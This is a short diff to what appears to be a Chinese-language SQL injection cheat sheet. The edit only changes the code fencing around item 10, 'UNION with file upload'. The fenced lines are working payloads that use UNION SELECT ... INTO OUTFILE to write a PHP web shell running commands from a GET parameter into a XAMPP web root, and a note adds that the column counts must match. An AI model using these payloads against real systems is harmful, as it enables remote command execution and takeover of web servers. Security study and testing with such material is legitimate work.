@@ -68,10 +68,10 @@ Name                  Count
 
 10. UNION 搭配上傳檔案:
 
-`sql
+```sql
 UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE 'D:/xampp/htdocs/shell.php'
 UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE 'D:/xampp/htdocs/shell.php'
-`
+```
 
 UNION 前後的欄位數量還是得匹配，才會成功執行
 
